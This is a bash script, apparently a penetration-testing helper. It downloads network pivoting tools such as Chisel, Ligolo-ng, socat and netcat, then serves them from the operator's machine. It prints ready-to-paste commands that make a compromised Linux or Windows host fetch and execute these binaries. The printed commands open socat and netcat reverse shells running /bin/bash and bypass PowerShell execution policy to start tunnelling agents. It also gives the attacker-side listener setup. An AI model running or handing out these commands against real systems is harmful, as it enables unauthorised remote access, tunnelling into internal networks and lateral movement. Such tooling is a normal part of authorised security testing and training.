#!/bin/bash

read -p "Your IP: " IP
PORT=$(shuf -i 8000-65000 -n 1)
mkdir -p /tmp/serve && cd /tmp/serve

echo "
========================================
 PIVOTING TOOLS DOWNLOADER
========================================
[1] Chisel
[2] Ligolo-ng
[3] Socat
[4] Plink
[5] Netcat
[6] Nmap static
[7] Custom file
[0] Done - Start server
========================================"

while true; do
  read -p "Choice: " C
  case $C in
    1)
      echo "[*] Downloading Chisel..."
      curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz -o chisel_linux.gz
      gunzip -f chisel_linux.gz 2>/dev/null
      chmod +x chisel_linux 2>/dev/null
      curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz -o chisel.exe.gz
      gunzip -f chisel.exe.gz 2>/dev/null
      mv chisel.exe chisel_win.exe 2>/dev/null
      echo "[+] Chisel ready"
      ;;
    2)
      echo "[*] Downloading Ligolo-ng agent..."
      curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz -o ligolo_linux.tar.gz
      tar xzf ligolo_linux.tar.gz 2>/dev/null
      mv agent ligolo_linux 2>/dev/null
      chmod +x ligolo_linux 2>/dev/null
      rm -f ligolo_linux.tar.gz
      curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip -o ligolo_win.zip
      unzip -qo ligolo_win.zip 2>/dev/null
      mv agent.exe ligolo_win.exe 2>/dev/null
      rm -f ligolo_win.zip
      echo "[+] Ligolo ready"
      ;;
    3)
      echo "[*] Downloading Socat..."
      curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -o socat_linux
      chmod +x socat_linux
      echo "[+] Socat ready (Linux only)"
      ;;
    4)
      echo "[*] Downloading Plink..."
      curl -sL https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -o plink.exe
      echo "[+] Plink ready (Windows only)"
      ;;
    5)
      echo "[*] Downloading Netcat..."
      curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -o nc_linux
      chmod +x nc_linux
      echo "[+] Netcat ready (Linux only)"
      ;;
    6)
      echo "[*] Downloading Nmap static..."
      curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -o nmap_linux
      chmod +x nmap_linux
      echo "[+] Nmap ready (Linux only)"
      ;;
    7)
      read -p "URL or path: " CF
      if [[ "$CF" == http* ]]; then
        [[ "$CF" == *github.com*blob* ]] && CF=$(echo "$CF" | sed 's|github.com|raw.githubusercontent.com|;s|/blob/|/|')
        FNAME=$(basename "$CF")
        curl -sL "$CF" -o "$FNAME"
        chmod +x "$FNAME" 2>/dev/null
        echo "[+] $FNAME ready"
      else
        cp "$CF" . 2>/dev/null
        echo "[+] $(basename "$CF") ready"
      fi
      ;;
    0)
      break
      ;;
    *)
      echo "[!] Invalid choice"
      ;;
  esac
done

echo ""
echo "========================================"
echo " FILES READY TO SERVE"
echo "========================================"
ls -lah 2>/dev/null | grep -v "^total" | grep -v "^\."

cat << COMMANDS

========================================
 LINUX - DOWNLOAD AND EXECUTE
========================================

# Chisel SOCKS
curl http://$IP:$PORT/chisel_linux -o /tmp/c&&chmod +x /tmp/c&&/tmp/c client $IP:9001 R:socks
wget http://$IP:$PORT/chisel_linux -O /tmp/c&&chmod +x /tmp/c&&/tmp/c client $IP:9001 R:socks

# Ligolo Agent
curl http://$IP:$PORT/ligolo_linux -o /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert
wget http://$IP:$PORT/ligolo_linux -O /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert

# Socat Reverse Shell
curl http://$IP:$PORT/socat_linux -o /tmp/s&&chmod +x /tmp/s&&/tmp/s TCP:$IP:4444 EXEC:/bin/bash

# Netcat Reverse Shell
curl http://$IP:$PORT/nc_linux -o /tmp/n&&chmod +x /tmp/n&&/tmp/n $IP 4444 -e /bin/bash

========================================
 WINDOWS - DOWNLOAD AND EXECUTE
========================================

# Chisel SOCKS (certutil)
certutil -urlcache -f http://$IP:$PORT/chisel_win.exe %TEMP%\\c.exe&&%TEMP%\\c.exe client $IP:9001 R:socks

# Chisel SOCKS (powershell)
powershell -ep bypass -c "iwr http://$IP:$PORT/chisel_win.exe -O \$env:TEMP\\c.exe;\$env:TEMP\\c.exe client $IP:9001 R:socks"

# Ligolo Agent (certutil)
certutil -urlcache -f http://$IP:$PORT/ligolo_win.exe %TEMP%\\a.exe&&%TEMP%\\a.exe -connect $IP:11601 -ignore-cert

# Ligolo Agent (powershell)
powershell -ep bypass -c "iwr http://$IP:$PORT/ligolo_win.exe -O \$env:TEMP\\a.exe;\$env:TEMP\\a.exe -connect $IP:11601 -ignore-cert"

# Plink SSH Tunnel
certutil -urlcache -f http://$IP:$PORT/plink.exe %TEMP%\\p.exe&&%TEMP%\\p.exe -ssh -R 9050 user@$IP -pw pass -N

========================================
 ATTACKER SETUP (RUN ON YOUR BOX)
========================================

# Chisel Server
chisel server -p 9001 --reverse

# Ligolo Proxy
ligolo-ng -selfcert -laddr 0.0.0.0:11601

# Netcat Listener
nc -lvnp 4444

========================================
 SERVING: http://$IP:$PORT/
 Ctrl+C to stop
========================================
COMMANDS

python3 -m http.server $PORT
